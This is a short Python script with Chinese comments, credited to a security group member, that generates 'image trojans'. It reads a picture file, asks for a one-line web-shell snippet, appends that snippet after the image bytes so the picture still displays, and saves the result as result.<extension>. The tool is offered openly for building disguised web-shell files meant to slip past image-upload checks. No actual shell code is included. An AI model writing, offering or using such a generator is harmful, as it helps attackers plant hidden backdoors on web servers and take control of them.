# code:utf-8
# design by purplefire

import binascii
import os

print("==================Nutshell==================")
print("===================坚果壳===================\n")
print(
    "坚果壳是夜月魂信息安全小组[紫火]使用python开发的一款图片木马生成器,本软件遵守GNU协议,完全开源，代码托管于github,如有问题请发送邮件至magician33333@163.com")
print("版本:Ver1.00\t\t构建日期:2015.10.24\n")


picture = input("请输入图片路径:")
if os.path.exists(picture):  # 判断文件是否存在
    try:
        pic_hex = binascii.hexlify(
            open(picture, "rb").read()).decode("utf-8")  # 将其转化为十六进制
    except Exception as e:  # 没有图片报错处理
        print(e)
        print("文件无法打开！！！\n")
else:
    print("文件不存在！！！\n")
    exit()  # 不存在直接退出

word = input("请输入一句话木马:")  # 输入一句话木马
# 将一句话木马转化为十六进制(utf-8格式)
word_hex = binascii.hexlify(word.encode("utf-8")).decode("utf-8")
# 将两段十六进制结合,并转化为字符串格式,注意:一句话木马在图片之后，避免破坏图片文件
result = binascii.a2b_hex((pic_hex + word_hex).encode("utf-8"))

pic_type = (lambda picture: picture.split(".")[-1])(picture)  # 判断文件后缀名

with open("result." + pic_type, "wb") as f:  # 以二进制的形式写入图片
    f.write(result)
    print("已经生成木马文件result." + pic_type)
